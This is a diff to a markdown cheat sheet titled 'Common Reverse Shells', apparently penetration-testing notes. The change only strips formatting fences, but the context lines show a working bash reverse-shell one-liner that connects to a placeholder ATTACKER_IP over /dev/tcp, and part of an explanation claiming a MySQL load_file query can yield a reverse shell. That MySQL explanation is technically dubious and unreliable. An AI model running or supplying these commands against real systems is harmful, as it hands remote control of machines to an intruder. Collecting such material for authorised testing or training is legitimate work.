@@ -1,6 +1,6 @@
 ﻿# Common Reverse Shells
 
-```ad-important
+
 `**Bash Reverse Shell** 
 `bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1` 
 
@@ -110,5 +110,5 @@
 **Explanation:** 
 - `mysql -e`: Executes a MySQL command. 
 - `select load_file(...)`: Attempts to load a file over TCP, effectively creating a reverse shell if the system is misconfigured.`
-```
+
 
